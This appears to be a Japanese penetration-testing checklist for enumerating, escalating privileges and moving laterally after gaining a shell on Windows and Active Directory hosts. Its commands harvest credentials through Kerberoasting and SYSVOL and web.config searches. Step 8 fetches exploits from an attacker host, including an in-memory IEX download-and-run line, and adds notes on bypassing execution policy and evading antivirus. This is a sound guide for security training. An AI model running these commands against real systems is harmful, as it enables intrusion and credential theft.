# Windows 侵入後 列挙チェックリスト（AD・スタンドアロン共通）

初期シェル（WinRM / SMB / RDP / Webシェル等）を取得したら、次の権限昇格・横断移動のために以下を確認する。

> **AD 環境か スタンドアロンかで優先度が変わる。**
> シェル取得直後の4手を打ち終えた後、`Get-ComputerInfo` の `Domain` 欄を確認する。
> - `Domain: WORKGROUP` → スタンドアロン。BloodHound（Step 2）はスキップ。Step 1.5 のローカルサービス確認を最優先にする。
> - `Domain: [ドメイン名]` → AD 参加済み。BloodHound による全体把握が最優先。

---

## 接続直後に打つコマンド（最初の4手）

シェルを取ったら何より先にこの4つを実行する。後続のステップ選択（CVE選択・BloodHound優先度・内部サービスの有無）に直結する。

```powershell
# 1. 自分が誰か・どの権限を持っているか（特権トークンの確認）
whoami /all

# 2. OSバージョン・ビルド番号（CVE選択に直結）・Domain欄でAD/スタンドアロン判定
Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OSDisplayVersion, WindowsBuildLabEx, CsDomain

# 3. ネットワーク構成（他ホストへの経路・DNSサーバーの確認）
ipconfig /all

# 4. ローカルにしか公開されていないサービスの確認
# 【発想の起点】nmap が見えるのは「外から届くポート」だけ。
# シェルを取って初めて「内部でしかリスニングしていないサービス」が見える。
# このサービスがバージョンの古い脆弱なプロセスであれば、権限昇格の経路になる。
netstat -ano | findstr TCP | findstr ":0"
```

打ち終わったら：
1. Step 0 で `Get-ComputerInfo` の出力を読む（CVE 選定の起点・AD/スタンドアロン判定）
2. Step 1 で `whoami /all` の Privileges を読む（即昇格できる特権がないか）
3. Step 1.5 で `netstat` の出力を読む（`127.0.0.1:[PORT]` が LISTENING なら内部サービス確認）
4. **AD 環境の場合のみ** Step 2 で BloodHound を Linux 側から実行する

---

## Step 0: `Get-ComputerInfo` 出力の読み方

**最初の3コマンドで取得した OS 情報を読む。コマンドの再実行は不要。**

CVE の適用可否・攻撃手法の選択に直結するため、出力の各フィールドの意味を押さえる。

**`Get-ComputerInfo` とは何か：** PowerShell の組み込みコマンドレット。OS のバージョン・ビルド番号・Windows エディション・ドメイン所属・ハードウェア情報など、システム全体の情報を一括取得できる。引数なしで実行すると大量の出力が出るため、`Select-Object` で必要な項目に絞ること。

**何が出たら次に何をするか：**

| 観測される出力 | 示唆 | 次のアクション |
|----------------|------|---------------|
| `WindowsProductName` がリリースから1年以内の最新OS（最新の Windows Server / Windows クライアント） | パッチ前提の新規CVEが残っている可能性 | ビルド番号と最新CVEを照合（後述の「新しいOSのCVE調べ方」） |
| 古いビルド番号（年単位で更新されていない） | 既知CVE多数の可能性 | `searchsploit` でビルド番号・KB番号を検索 |
| `WindowsInstallationType: Server Core` | GUIなし。PowerShell操作が前提 | GUI前提のコマンド・Explorer.exe 系は使えない |
| `Domain:` フィールドにドメイン名 | ドメイン参加済み | AD環境として Kerberos・LDAP の攻撃手法を検討 |
| `Domain:` が `WORKGROUP` | スタンドアロン | ローカル権限昇格に集中（AD攻撃は不要） |

**簡易確認（出力が少なくて速い）：**

```powershell
systeminfo | findstr /C:"OS Name" /C:"OS Version" /C:"Domain" /C:"System Type"
```

### 新しいOS（searchsploit に載っていない場合）の CVE 調べ方

リリースから1年以内のOS・最新ビルドの場合、`searchsploit` には未掲載のことが多い。以下の順で探す：

1. **ベンダーのセキュリティブログ** — Akamai / SpecterOps / Microsoft MSRC / Trustedsec / Semperis 等
2. **GitHub** — `"CVE-202X-XXXXX" PoC`・`"[OS名] [機能名]" exploit` で検索。Star数・最終コミット日を確認
3. **X（旧Twitter）** — CVE番号で検索。研究者が PoC を最速で公開する場
4. **NVD** — `https://nvd.nist.gov/` で CPE と影響範囲を確認

→ 詳細: `../../05_Tools_Reference/Searchsploit.md`（「Exploit-DB 以外の情報源と使い分け」セクション）

---

## Step 1: `whoami /all` 出力の読み方（特権トークンの確認）

**最初の3コマンドで取得した出力を読む。コマンドの再実行は不要。**

```powershell
# 必要に応じてドメインユーザーの追加情報を取得
net user [USERNAME] /domain   # ドメイン上のユーザー情報・最終ログオン・所属グループ
```

**着眼点 — Privileges 欄を最優先で確認する：**

| 特権 | 悪用方法 |
|------|---------|
| `SeImpersonatePrivilege` | Potato 系攻撃で SYSTEM に昇格 |
| `SeAssignPrimaryTokenPrivilege` | 同上 |
| `SeBackupPrivilege` | SAM / SYSTEM ハイブの読み取り |
| `SeRestorePrivilege` | 任意ファイルの書き込み |
| `SeMachineAccountPrivilege` | ドメインにコンピューターアカウントを追加可能 → **RBCD 攻撃** |
| `SeEnableDelegationPrivilege` | Unconstrained Delegation を設定可能 |
| `SeDebugPrivilege` | プロセスメモリへのアクセス → LSASS ダンプ |

---

## Step 1.5: ローカルにしか公開されていないサービスの発見

nmap では外部から見えなかったサービスが、内部ではリスニングしている場合がある。
**`netstat` で確認し、ポート番号から何のサービスか特定する。**

**攻撃者の思考トレース：** 初期アクセスで露出していたポートは「外に公開している部分」にすぎない。
内部にしか繋がれていないサービス（バージョンが古い管理ツール・開発環境・内部DB等）を
ポートフォワーディングで手元に引き込むことで追加の攻撃面が生まれる。

```powershell
# [Target] ローカルでリスニングしているTCPポートを確認
netstat -ano | findstr TCP | findstr ":0"
# 出力例：
# TCP    127.0.0.1:8888    0.0.0.0:0    LISTENING    8856
#                ^^^^                                  ^^^
#          ローカルのみリスニング中              プロセスID (PID)

# PIDからプロセス名を特定
tasklist /FI "PID eq [PID]"
# 例：PID 8856 → [SERVICE_NAME].exe
```

**出力の読み方：**

| 出力パターン | 意味 | 次のアクション |
|------------|------|--------------|
| `127.0.0.1:[PORT]` が LISTENING | ローカルにのみ公開。外部から直接アクセス不可 | `tasklist` で PID を特定 → サービス名を検索 → 脆弱なバージョンなら searchsploit |
| `0.0.0.0:[PORT]` が LISTENING | 全インターフェース公開。nmap で既に見えているはず | nmap スキャン結果と照合して抜け漏れを確認 |
| `[::]:PORT` が LISTENING | IPv6 で全インターフェース公開 | 同上 |

**インストール済みソフトウェアの確認（バージョン特定）：**

```powershell
# [Target] インストール済みソフトウェアの一覧
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
  Select-Object DisplayName, DisplayVersion, Publisher | Format-Table -AutoSize

# または Downloads・Program Files を直接確認
dir C:\Users\[USER]\Downloads
dir "C:\Program Files"
dir "C:\Program Files (x86)"
```

ローカルにしか公開されていないサービスに脆弱なバージョンがある場合 → **ポートフォワーディングで手元に引き込んで攻撃する**
→ Chisel を使ったポートフォワーディング: `../../05_Tools_Reference/Chisel.md`
→ Exploit-DB PoC を使った Buffer Overflow: `Buffer_Overflow_LocalService.md`

---

## Step 2: BloodHound でAD全体を把握（最重要）

> **`Windows_AD_Attack_Flow.md` Step 3.5 の段階で既に Linux 側で実行済みであれば、ここでは結果の確認だけでよい。** BloodHound は Windows シェル内ではなく **Linux（攻撃側）から1回実行するだけ** が正解。Windows シェル経由で何かを打ち直す必要はない。

```bash
# [Attacker] 未実行の場合のみ。テスター端末から実行
bloodhound-python -u [USER] -p '[PASSWORD]' -ns [DC_IP] -d [DOMAIN] -c All
# [DC_IP] は単一ホスト案件では [IP] と同じ。AD が複数DCで分散している場合のみ DC のIP を別途指定する
```

**BloodHound で確認すべき項目（GUI で）：**
1. 「Shortest Paths to Domain Admins」→ 現在のユーザーから Domain Admins への最短ルート
2. 「Find All Domain Admins」→ DA メンバーの把握
3. 「Find Principals with DCSync Rights」→ DCSync が可能なアカウント
4. 現在のユーザー・所属グループが持つ ACE（アクセス制御エントリ）

→ 詳細: `../../05_Tools_Reference/BloodHound.md`

---

## Step 3: グループとメンバーシップの確認

```powershell
# 所属グループの確認
net user [USERNAME] /domain

# Domain Admins のメンバー
net group "Domain Admins" /domain

# 高権限グループの確認
net group "Enterprise Admins" /domain
net group "Account Operators" /domain
net group "Backup Operators" /domain
```

---

## Step 4: コンピューターアカウントの列挙

```bash
# Linux 側から
netexec ldap [IP] -u [USER] -p '[PASSWORD]' --computers
```

**着眼点：** Unconstrained Delegation が設定されたコンピューターを探す。

---

## Step 5: Kerberoastable / ASREPRoastable アカウントの確認

```bash
# Kerberoastable（SPN付きアカウント）
netexec ldap [IP] -u [USER] -p '[PASSWORD]' --kerberoasting output.txt

# ASREPRoastable（事前認証不要アカウント）
netexec ldap [IP] -u [USER] -p '[PASSWORD]' --asreproast output.txt
```

→ 詳細: `Kerberos_Attacks/Kerberoasting.md`, `Kerberos_Attacks/ASREPRoasting.md`

---

## Step 6: SYSVOL / NETLOGON の確認

```bash
smbclient //[IP]/SYSVOL -U '[DOMAIN]\[USER]%[PASSWORD]' -c "recurse ON; ls"
```

認証済みユーザーとして SYSVOL にアクセスし、スクリプトに他ユーザーの認証情報が含まれていないか確認する。匿名アクセス時に見逃した内容も、認証済みなら追加で取れることがある。

→ 詳細: `../../01_Reconnaissance/SMB_Enumeration.md`

---

## Step 7: Webアプリのソースコード確認（IIS環境）

nmap スキャンで 80/443 が開いていた場合、IIS の Web ルートにアプリのソースコードが置かれていることがある。**認証情報・DB接続文字列・ロジックの把握**に使う。

```powershell
# IIS のデフォルト Web ルートを確認
ls C:\inetpub\

# アプリのファイルを確認（app.py、web.config 等）
ls C:\inetpub\[サイト名]\

# web.config に DB 接続文字列・パスワードが埋め込まれていることがある
type C:\inetpub\[サイト名]\web.config

# Python/Flask アプリの場合はメインスクリプトを確認
type C:\inetpub\[サイト名]\app.py
```

**`inetpub` とは何か：** IIS（Internet Information Services、Windows 標準の Web サーバー）のデフォルトルートディレクトリ。`C:\inetpub\wwwroot` がデフォルト公開フォルダだが、複数サイトを運用している場合はサイト名のサブフォルダが作られる。Webアプリが稼働しているサーバーでは必ず確認する。

**着眼点：**
- `web.config` に DB 接続文字列・パスワード・API キーが平文で書かれていることがある
- `app.py` / `*.py` / `*.php` 等のソースからパスワードハッシュのアルゴリズムが判明する（クラックのモード選択に使う）
- アプリの認証ロジックを読むことでバイパス方法が見つかる場合がある

### Windows シェルでのディレクトリ一覧コマンドの使い分け

`ls`（PowerShell の `Get-ChildItem` のエイリアス）以外にも目的別の選択肢がある。**特に「ファイル構造を一目で把握する」用途では `tree /f` が圧倒的に見やすい。**

| コマンド | 用途 | 特徴 |
|---------|------|------|
| `ls` / `Get-ChildItem` | 単一ディレクトリの確認 | PowerShell 標準。サイズ・タイムスタンプが見やすい |
| `Get-ChildItem -Recurse -Force` | 隠しファイル含む全再帰列挙 | 大きいフォルダで時間がかかる。`-Filter` で絞る |
| `tree /f` | フォルダ構造をツリー表示 | cmd.exe コマンド。**構造把握に最適** |
| `tree /f /a` | ASCII 文字でツリー表示 | 文字化け回避。コピペ・記録用 |
| `dir /s /b` | 再帰でフルパスのみ列挙 | grep に流しやすい（`dir /s /b \| findstr "config"`） |

```powershell
# 構造を見る（一番便利）
tree /f C:\inetpub

# 特定の文字列を含むファイルを探す
dir /s /b C:\ | findstr /i "config.json web.config .kdbx"
```

---

## Step 7.5: PSSession による別ユーザーとしての横断移動

**着火条件：** GenericAll / ForcePasswordChange / KeePass からの認証情報等で **別のドメインユーザーのパスワードが判明**しており、そのユーザーとして操作したい場合。または WinRM 直接接続でなく、**ローカルループバック（127.0.0.1）経由で PSSession を張る**必要がある場合。

> **PSSession とは：** PowerShell Remoting（WinRM 上で動作）を使って別の Windows ホストまたは別ユーザーのコンテキストでコマンドを実行できる仕組み。`New-PSSession` でセッションを作成し、`Enter-PSSession` で対話操作、`Invoke-Command` でコマンドを送り込む。

**攻撃者の思考トレース：** evil-winrm でのリモートシェルは「外から入る」経路。PSSession の 127.0.0.1 接続は「ターゲット内部で別ユーザーに乗り換える」経路。WinRM が外部から閉じていても内部では使えることが多い。

### 別ユーザーとして対話シェルに入る

```powershell
# [Target] 移行先ユーザーの認証情報を作成
$pass = ConvertTo-SecureString -AsPlainText -Force '[TARGET_USER_PASSWORD]'
$cred = New-Object System.Management.Automation.PSCredential('[DOMAIN]\[TARGET_USER]', $pass)

# セッション作成・接続
$session = New-PSSession -ComputerName 127.0.0.1 -Credential $cred
Enter-PSSession -Session $session

# 確認
whoami    # → DOMAIN\TARGET_USER になっていることを確認
```

### 別ユーザーとしてコマンドを1回実行（対話不要な場合）

```powershell
# [Target] Invoke-Command で単発実行（セッションを作らずに済む）
$pass = ConvertTo-SecureString '[TARGET_USER_PASSWORD]' -AsPlaintext -Force
$cred = New-Object System.Management.Automation.PSCredential('[DOMAIN]\[TARGET_USER]', $pass)
Invoke-Command -ComputerName 127.0.0.1 -Credential $cred -ScriptBlock { whoami }
# → 確認後、必要なコマンドを ScriptBlock 内に入れる
```

**PSSession で確認すべき事項（別ユーザーになったら最初に実行）：**

```powershell
# [Target/PSSession] 権限の確認
whoami /all

# グループ所属（次の権限昇格の手掛かり）
net user [TARGET_USER] /domain

# このユーザーのデスクトップ・ドキュメントに何があるか
dir C:\Users\[TARGET_USER]\Desktop
dir C:\Users\[TARGET_USER]\Documents

# BloodHound で次のエッジを確認（別ウィンドウ）
# → このユーザーの次の GenericAll / ForcePasswordChange / WriteDACL 等を確認する
```

### PSSession の終了と次のユーザーへの移行

```powershell
# [Target] PSSession を終了して1つ前のセッションに戻る
exit

# → 戻ったセッションから次のユーザーへの操作を実行する
```

**注意点：**
- PSSession を多段で積み上げると混乱する。`whoami` で常に現在のユーザーを確認する
- ループバック（`127.0.0.1`）接続が失敗する場合は、WinRM のローカルループバック許可を確認: `winrm get winrm/config/client`

---

## Step 8: Windows PoC の取得・転送・実行（CVE悪用が必要な場合）

CVE の悪用に PoC（概念実証コード）が必要な場合の手順。Linux の場合は `wget` + `make` が基本だが、Windows では転送手段が異なる。

### evil-winrm でのファイルアップロード

evil-winrm には組み込みのファイル転送機能がある。

```bash
# [Attacker] evil-winrm 接続時に転送用ディレクトリを指定する
evil-winrm -i [IP] -u [USER] -p '[PASSWORD]' \
  -s /path/to/scripts/   # PowerShellスクリプトを読み込むディレクトリ
```

```powershell
# [evil-winrm シェル内] ローカルファイルをターゲットにアップロード
upload /path/on/attacker/exploit.exe C:\Windows\Temp\exploit.exe

# ダウンロード（ターゲットからテスター端末へ）
download C:\Users\admin\file.txt /path/on/attacker/file.txt
```

### PowerShell でのダウンロード（テスター端末で HTTP サーバーを起動）

```bash
# [Attacker] HTTP サーバーを起動してファイルを配信
cd /path/to/exploit/
python3 -m http.server 8888
# テスター側の到達可能インターフェース（環境によって物理LAN・VPN・専用線等が変わる）の IP を使う: ip a
```

```powershell
# [ターゲット] PowerShell でダウンロード
Invoke-WebRequest -Uri "http://[ATTACKER_IP]:8888/exploit.exe" -OutFile "C:\Windows\Temp\exploit.exe"

# または短縮形（エイリアス）
iwr "http://[ATTACKER_IP]:8888/exploit.exe" -OutFile "C:\Windows\Temp\exploit.exe"

# certutil を使う方法（PowerShell が制限されている場合の代替）
certutil -urlcache -f http://[ATTACKER_IP]:8888/exploit.exe C:\Windows\Temp\exploit.exe
```

### PowerShell スクリプト（.ps1）をメモリ上で実行

ファイルを書き込まずにメモリ上で直接実行する手法。アンチウイルスによる検知を回避しやすい。

```powershell
# [ターゲット] スクリプトをメモリ上でダウンロードして実行（IEX）
IEX (Invoke-WebRequest -Uri "http://[ATTACKER_IP]:8888/exploit.ps1" -UseBasicParsing).Content
```

### CVE の調べ方（PoC を探す前に）

```bash
# [Attacker] バージョン情報からCVEを検索
searchsploit windows server [年]
searchsploit [技術名] [バージョン]

# GitHub での PoC 検索
# GitHub で "CVE-[年]-[番号] PoC" または "CVE-[年]-[番号] exploit" を検索
# Star数・コミット日時・README の前提条件を確認してから使う
```

→ CVE の絞り込み基準・新しい OS 用の調べ方の詳細 → `../../05_Tools_Reference/Searchsploit.md`（「searchsploit が0件のときのフロー」）

**注意点・落とし穴：**
- 実行前に `C:\Windows\Temp` への書き込み権限があるか確認する（`echo test > C:\Windows\Temp\test.txt`）
- PowerShell の実行ポリシーが `Restricted` の場合は `.ps1` を直接実行できない。`IEX` 経由か `powershell -ExecutionPolicy Bypass -File exploit.ps1` で回避
- GitHub から落とした PoC は README で**前提条件**（OS バージョン・権限・必要なグループ）を必ず確認してから実行する
- 新しいバージョンの Windows Server / Windows クライアントには新しいセキュリティ機構（Windows Defender・AMSI 等）が有効なことが多い。エラーが出た場合はアンチウイルス回避を検討する

---

## 関連技術
- 前：WinRM シェルの取得 → `../../02_Initial_Access/Protocol_Exploitation.md`（WinRMセクション）
- 前：パスワードスプレーで初期シェル取得 → `../../00_Playbook/Windows_AD_Attack_Flow.md`（Step 3.5）
- 後：BloodHound で ACE が判明 → `ACE_Abuse/` 配下の該当ファイル
- 後：SeMachineAccountPrivilege がある → `Delegation_Attacks/RBCD.md`
- 後：SeEnableDelegationPrivilege がある → `Delegation_Attacks/Unconstrained.md`
- 後：Kerberoastable アカウントがある → `Kerberos_Attacks/Kerberoasting.md`
- 後：CVE の絞り込み・PoC の探し方 → `../../05_Tools_Reference/Searchsploit.md`
